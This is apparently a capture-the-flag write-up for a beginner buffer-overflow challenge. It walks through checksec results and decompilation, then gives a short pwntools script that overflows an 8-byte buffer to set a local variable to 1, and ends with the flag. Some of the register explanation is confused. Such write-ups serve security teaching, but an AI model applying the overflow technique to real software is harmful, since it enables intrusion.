# baby-pwn-0.25 
> Write-up author: vreshco
## DESCRIPTION:
Kamu tau gak kalau buffer overflow bisa merubah nilai local variable?

koneksikan menggunakan:
## HINT:
- NONE
## STEPS:
1. First, download the file given, then check the file type.

> RESULT - 64 BIT binary file, not stripped.

![image](https://user-images.githubusercontent.com/70703371/213629876-7d4832a5-208a-4b48-b3b7-a73f834d8973.png)


2. Now check the binary's protection.

> RESULT - No Canary Found - Partial RELRO (hence we could do bufferoverflow and overwrite the got address).

![image](https://user-images.githubusercontent.com/70703371/213629958-53164253-0fb1-42e5-84a2-3b46b2c1a468.png)


3. But let's straight to decompile the binary to see it's flow.
4. The `vuln()` function is called at the `main()`. Let's check that.

![image](https://user-images.githubusercontent.com/70703371/213630456-9095f353-a907-42a4-84fc-c16d30e1dbd4.png)


5. Based from it, we need to overwrite the `local_c` value to 1. To did that we need to know the **RIP** offset hence can overwrite the **RBP** values then we can change the `local_c` value.
6. The vuln here is the `local_14` variable accept only 8 bytes, but the `fgets` function wants it to accepts 16 bytes. Hence we can utilize this to do bufferoverflow.
7. After overflow the buffer we since we need to change the value of variable `local_c` to 1, then we need to add `0x1` at the end of our payload or padding bytes.
8. To solve this challenge i used pwntools.

> THE SCRIPT

```py
from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:  
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  
        return process([exe] + argv, *a, **kw)


exe = './chall'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

sh = start()
sh.recvuntil(b'\n')
offset = b'A' * 8
p = flat([
    offset,
    1
])
#offset += p64(1)
sh.sendline(p)
sh.interactive()
```

> OUTPUT

![image](https://user-images.githubusercontent.com/70703371/213631284-b046b20e-b107-4b2a-852b-23a3ad6a3a74.png)


9. As we can see, when i tried to run it locally, we successfuly change the value of `local_c` to 1.
10. Now let's test it remotely.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/213631522-483fde41-4115-4399-8c2a-ed910321fbd3.png)


11. Got the flag!

## FLAG

```
TCP1P{change_local_variable_value_using_buffer_overflow}
```









